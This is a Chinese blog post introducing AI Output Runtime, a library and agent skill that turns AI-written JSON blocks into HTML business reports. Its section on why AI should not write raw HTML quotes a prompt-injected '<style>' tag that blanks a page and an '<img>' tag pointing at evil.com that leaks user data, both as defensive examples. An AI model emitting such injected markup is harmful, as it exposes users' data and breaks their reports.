半年前 r/ClaudeCode 上吵过一阵：让 AI 写业务报告，应该输出 **HTML 还是 Markdown**？

HTML 派说：图表、对比矩阵、布局、KPI 仪表，Markdown 表达不出来。
Markdown 派说：HTML 不安全，模型可能写出带 prompt injection 的 `<style>`、`<script>`、`<iframe>`。

两边都对。但都没说出第三条路：**让 AI 只输出"数据"，让一份小小的 runtime 把数据安全地变成 HTML**。

我把这条路做出来了 —— AI Output Runtime（AIO），最新 v0.4.3。这篇说说它能干什么、为什么这么设计、以及怎么用。读完你可以带走的东西：

1. 一个能直接拿去用的 28 KB 浏览器 runtime（CDN 直引）。
2. 一份 15 个组件的"业务报告组件库"，能让 Claude/Codex 给你出周报、月报、复盘、KPI、P&L、销售漏斗、风险矩阵这些。
3. 一种思路：把"AI 能干什么"和"AI 不能干什么"分得很开，写在 schema 里。
4. 一个直接装到 Claude Code / Codex / Cursor 的 agent skill。

---

## 一个最小例子

AI 在 Markdown 里写这样一段（注意 info string 是 `aio:name@major`，body 是合法 JSON）：

    ```aio:trend-card@1
    {
      "items": [{
        "label": "GMV",
        "value": 12345678,
        "format": "currency:CNY",
        "delta": { "value": 0.083, "format": "percent", "direction": "up" },
        "spark": [9.1, 9.6, 10.2, 11.1, 10.8, 11.7, 12.3],
        "tone": "good"
      }]
    }
    ```

浏览器载入 runtime（一个 `<script>` 标签）后，这段 JSON 被渲染成：

> **GMV**
> **¥12,345,678.00** ▲ 8.3% (vs 上周)
> 📈 内嵌一条小 sparkline

AI 没写任何 HTML/CSS/JS，runtime 负责所有的视觉。

## 为什么不让 AI 直接写 HTML

直接生成的两个真实风险：

- **prompt injection**：用户输入里藏一句 `<style>body{display:none}</style>`，AI 一并贴进 report 里，整页消失。
- **第三方 fetch**：AI 引一个 `<img src="https://evil.com/x.png?...">`，把用户数据通过 referer/url 偷出去。

AIO 的做法是在 schema 层把这些路径全堵死：

- 任何 string 字段不允许 `<` 或 `>`（runtime + CLI 双重校验）。
- block 必须是合法 JSON（注释、trailing comma 都拒）。
- 组件名必须是 registry 里登记过的（`aio:xxx@1` 没被注册的整块降级为可见的 JSON 错误，不爆 XSS）。
- runtime 自己没有 `fetch` 调用；唯一的网络请求是按需加载代码块语法高亮的 lang 模块（URL 白名单：`https://cdn.jsdelivr.net/gh/wxkingstar/...`）。

## v0.4.x 的 15 个组件，对应业务场景

| 你要做的报告 | 用哪些组件 |
|---|---|
| 周报 / 月报 / 季报 / 业务汇报 | `report-header` + `trend-card` + `status-grid` + `timeline` + `action-items` |
| Postmortem / 事故复盘 | `timeline` + `action-items` + `callout` |
| KPI / OKR 达成度看板 | `gauge`（半圆仪表，按达成度自动着色） |
| 财务 P&L 桥 / 经营变动归因 | `waterfall`（start / up / down / subtotal / end） |
| 销售转化漏斗 / 注册激活分析 | `funnel`（自动算环比 + 累计转化率） |
| 运营时段 / 仓储热力 / 区域品类 | `heatmap`（最大 32×32 的二维网格） |
| 风险评估 / RICE / BCG 优先级 | `matrix`（2×2 象限散点） |
| 方案选型 / 竞品比较 / Vendor 评分 | `comparison`（多选项 × 多维度，可标推荐列） |
| 静态数据 / 多服务状态 | `metric-cards` / `status-grid` / `table` |
| 结论 / 风险预警 / 推荐 | `callout`（info / success / warning / danger） |

每个组件都有自己的 schema，CLI 在校验时同时检查跨字段不变量（比如 funnel 的 stage value 必须单调非增，matrix 的 item 坐标必须在 `[xMin, xMax] × [yMin, yMax]` 内，waterfall 第一根柱必须是 `kind: "start"`）。

## 代码块同时也能高亮，30 种语言

不只是数据组件 —— AI 写代码块也能拿到漂亮高亮。**6 个内置**（json / bash / js+ts / python / yaml / diff），24 个 **lazy-load**（go / rust / php / ruby / java / kotlin / swift / c / cpp / csharp / sql / html / css / xml / dockerfile / toml / ini / lua / perl / r / scala / dart / regex / graphql）。

runtime 主文件只有 28 KB gzipped。第一次有人在你的报告里用 `rust` 语言，浏览器从 jsDelivr 拉 `lang/rust.js`（约 1.1 KB）再 in-place 重新渲染那块代码。

## Reader-facing 体验，不是"裸 markdown 凑活"

v0.4.x 加的几个对人最有感的东西：

- **自动 Executive Summary 卡**：扫文档自动抽取首个 callout + 首个 trend-card，生成一张 10 秒看懂的折叠摘要卡，挂在 report-header 后面。
- **数字千分位 + locale 货币**：默认走 `Intl.NumberFormat`，根据文档 `lang` 自动选格式。`12345678` 在 zh-CN 渲染为 `12,345,678`，在 `currency:CNY` 下变成 `¥12,345,678.00`，在 `currency:JPY` 下变成 `￥12,345,678`。
- **Sticky TOC + 当前章节高亮**：≥1200px 的屏右栏粘住，IntersectionObserver 标红当前章节。
- **章节锚点**：hover h1/h2/h3 出 `#` 图标，点击复制章节链接到剪贴板。
- **打印封面 + H1 分页**：`@page` A4，report-header 自动变封面页，每个 H1 强制分页。`Cmd+P` → "Save as PDF" 就是一份可发邮件的报告。
- **CSV 一键导出**：table/chart/heatmap/funnel/waterfall/trend-card/comparison/gauge 头部条都有 `⤓ CSV` 按钮，分析师朋友能直接拿原始数据。

## 装到 Claude Code / Codex / Cursor

```bash
npx skills add wxkingstar/ai-output-runtime -g -y
```

之后 Claude Code 看到你说**"出一份月报"** / **"Q1 OKR 复盘"** / **"做个销售漏斗"** / **"评估一下风险"** 会自动激活这个 skill，按 AIO 契约输出。skill 的描述里中英双语触发词覆盖了 50+ 个业务报告场景。

## 在线 demo（**这个 demo 页本身就是一份 AIO 文档**）

主页：https://wxkingstar.github.io/ai-output-runtime/

（点顶栏的"查看源稿"能看到生成它的原始 Markdown，非常直观）

两个完整业务 demo：

- 周报：https://wxkingstar.github.io/ai-output-runtime/demo-weekly.html
- Q1 Dashboard：https://wxkingstar.github.io/ai-output-runtime/demo-dashboard.html

## 这个项目刻意不做的事

- **不重新发明可视化**：就 line/bar/area/pie/donut + 5 个商业图表。复杂的让 ECharts/D3 上，AIO 留在"5 分钟产出一份能看的报告"这条线。
- **不渲染富文本 HTML**：字段只接 plain text + 一小段受限 Markdown 内联（加粗/斜体/inline code/链接），HTML 标签一律拒。
- **不留任何 prompt injection 通道**：style、script、event handler、template expression、custom component 全部 schema 禁。

## 我踩过的坑（你可以避开）

1. **第一版数字默认 raw 输出** —— `12800000` 看着像编号不像金额。v0.4.3 改成默认千分位后，被人评论"这才像报告"。
2. **第一版漏斗的 value 写在 bar 里面** —— bar 一旦 < 1% 数字就被吃掉。改成永远显示在 bar 右侧外。教训：数据可视化里"小柱体"是边界 case。
3. **第一版 SKILL.md 的 description 只列了 4 个组件** —— 加完 11 个新组件后路由器还在按老描述触发，AI 不会主动用新组件。v0.4.2 把 description 扩到 50+ 触发词才修正。

## 仓库 & 反馈

GitHub（MIT）：https://github.com/wxkingstar/ai-output-runtime
skills.sh listing：https://skills.sh/wxkingstar/ai-output-runtime

最想听的反馈：

- 你的业务报告里有哪种形态，AIO 这 15 个组件没覆盖到？
- 把这个 skill 装到 Claude 后，让它出报告时哪里"违反直觉"？
- 用 Claude 做 stakeholder 报告你最大的痛点是什么？

issues 区见。
